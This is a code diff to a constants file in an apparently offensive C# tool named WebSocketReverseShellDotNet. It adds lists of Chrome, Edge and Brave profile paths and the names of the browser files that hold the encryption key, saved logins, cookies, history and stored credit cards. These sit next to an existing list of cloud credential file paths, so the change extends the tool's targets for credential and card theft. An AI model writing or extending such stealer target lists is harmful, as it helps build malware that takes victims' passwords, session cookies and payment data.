@@ -60,9 +60,29 @@ namespace WebSocketReverseShellDotNet.utils
             "%APPDATA%\\gcloud\\application_default_credentials.json",
             "%USERPROFILE%\\.oci\\config",
             "%GOOGLE_APPLICATION_CREDENTIALS%",
-
         ];
 
+        public static string[] LIST_OF_BROWSER_LOCATIONS = [
+            "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\",
+            "%LOCALAPPDATA%\\Google\\Chrome SxS\\User Data\\",
+            "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",
+            "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\",
+        ];
+
+        public static string ENCRYPTION_KEY_BROWSER_DB = "Local State";
+
+        public static string[] LIST_OF_PROFILE_LOCATIONS = [
+            "Default\\",
+            "Profile 1\\",
+            "Profile 2\\",
+            "Profile 3\\",
+            "Profile 4\\",
+            "Profile 5\\",
+        ];
+        public static string LOGIN_DATA_BROWSER_DB = "Login Data";
+        public static string COOKIES_BROWSER_DB = "Network\\Cookies";
+        public static string HISTORY_BROWSER_DB = "History";
+        public static string CREDIT_CARDS_BROWSER_DB = "Web Data";
 
     }
 }
